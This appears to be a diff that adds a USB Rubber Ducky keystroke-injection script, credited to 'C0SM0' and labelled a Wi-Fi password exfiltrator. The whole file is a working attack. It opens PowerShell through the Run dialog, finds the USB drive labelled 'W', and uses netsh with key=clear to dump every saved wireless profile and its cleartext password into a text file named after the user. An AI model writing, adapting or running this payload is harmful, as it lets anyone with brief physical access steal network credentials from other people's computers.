@@ -1,0 +1,22 @@
+REM usb rubber ducky wifi password exfiltrator
+REM created by : C0SM0
+
+REM let the computer recognize the twinduck
+DELAY 1000
+
+REM open powershell via runbox
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM cd into twinduck labled "W"
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'W'}|select name;cd $u.name
+ENTER
+DELAY 100
+
+REM exfiltate wifi passwords to a file
+REM file named after the computer name
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >$env:UserName".txt"; exit
+ENTER
